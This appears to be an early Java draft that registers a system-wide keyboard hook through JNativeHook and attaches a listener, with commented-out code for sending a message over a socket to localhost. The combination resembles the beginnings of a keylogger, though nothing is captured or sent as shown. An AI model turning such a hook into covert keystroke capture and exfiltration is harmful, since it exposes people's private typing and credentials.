// import java.io.*;  
// import java.net.*;  cs
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class App {
    
    public static void main(String[] args) throws Exception {
        // System.out.println("Hello, World!");
        Listener keylis = new Listener();

        try {
			GlobalScreen.registerNativeHook();
		}
		catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}
        GlobalScreen.addNativeKeyListener(keylis);
       

        // try{  aaa    

        //     Socket s=new Socket("localhost",6666);  
        //     DataOutputStream dout=new DataOutputStream(s.getOutputStream());  
        //     dout.writeUTF("Hello Server");  
        //     dout.flush();  
        //     dout.close();  
        //     s.close();  
        //     }catch(Exception e){
        //    System.out.println(e);
        //    }  
    }
}
